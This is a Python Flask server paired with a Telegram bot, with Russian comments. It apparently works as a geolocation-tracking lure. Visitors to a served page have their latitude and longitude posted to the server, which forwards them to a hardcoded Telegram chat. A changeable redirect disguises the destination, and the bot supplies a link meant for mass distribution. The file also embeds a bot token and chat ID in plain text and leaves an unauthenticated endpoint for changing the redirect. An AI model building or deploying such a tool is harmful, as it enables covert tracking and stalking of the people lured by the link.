from flask import Flask, request, send_from_directory
import requests
from flask_cors import CORS
import telebot
from telebot import types
import os

app = Flask(__name__)
CORS(app)

BOT_TOKEN = '7673156387:AAF6Eop_JRvOY1dncc5ObC_CdBsAsQF2VJU'  # Твой токен
CHAT_ID = 651911888  # Твой Telegram ID
RENDER_URL = 'https://geo-tracker-l5ui.onrender.com'  # Твой Render URL, можно менять через бота

bot = telebot.TeleBot(BOT_TOKEN)

# Храним текущий редирект в переменной
redirect_url = RENDER_URL

# Множество пользователей, которые присылают новый URL редиректа
user_waiting_for_url = set()

def is_authorized(message):
    return message.chat.id == CHAT_ID

def send_to_telegram(lat, lon):
    text = f"📍 Новая геолокация:\nШирота: {lat}\nДолгота: {lon}"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": text}
    requests.post(url, data=data)

@app.route('/')
def serve_index():
    return send_from_directory('static', 'index.html')

@app.route('/send_location', methods=['POST'])
def send_location():
    data = request.json
    lat = data.get("latitude")
    lon = data.get("longitude")
    if lat and lon:
        send_to_telegram(lat, lon)
        return {"status": "ok"}
    return {"status": "error"}, 400

@app.route('/redirect')
def get_redirect():
    # Возвращаем текущий редирект, чтобы JS на странице мог знать, куда отправлять
    return {"url": redirect_url}

@app.route("/set_redirect", methods=["POST"])
def set_redirect():
    global redirect_url
    data = request.json
    new_url = data.get("url")
    if new_url and (new_url.startswith("http://") or new_url.startswith("https://")):
        redirect_url = new_url
        return {"status": "ok"}
    return {"status": "error"}, 400

# --- Телеграм бот ---

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    if not is_authorized(message):
        return
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row('Изменить редирект', 'Скинуть ссылку на мой Render')
    bot.send_message(message.chat.id, "Выбери действие:", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text == 'Изменить редирект' and is_authorized(m))
def ask_redirect(message):
    bot.send_message(message.chat.id, "Пришли новую ссылку для редиректа (начиная с http:// или https://):")
    user_waiting_for_url.add(message.chat.id)

@bot.message_handler(func=lambda m: m.chat.id in user_waiting_for_url and is_authorized(m))
def set_redirect_from_message(message):
    url = message.text.strip()
    if url.startswith('http://') or url.startswith('https://'):
        global redirect_url
        redirect_url = url
        bot.send_message(message.chat.id, f"✅ Редирект установлен на:\n{url}")
        user_waiting_for_url.remove(message.chat.id)
    else:
        bot.send_message(message.chat.id, "❌ Ошибка: ссылка должна начинаться с http:// или https://. Попробуй ещё раз.")

@bot.message_handler(func=lambda m: m.text == 'Скинуть ссылку на мой Render' and is_authorized(m))
def send_render_link(message):
    bot.send_message(message.chat.id, f"Вот твоя ссылка для рассылки:\n{redirect_url}")

# Запускаем Flask и бота

def run_bot():
    bot.infinity_polling()

if __name__ == '__main__':
    from threading import Thread
    port = int(os.environ.get("PORT", 5000))
    # Запускаем Flask в отдельном потоке, чтобы бот и сервер работали вместе
    Thread(target=lambda: app.run(host="0.0.0.0", port=port)).start()
    run_bot()
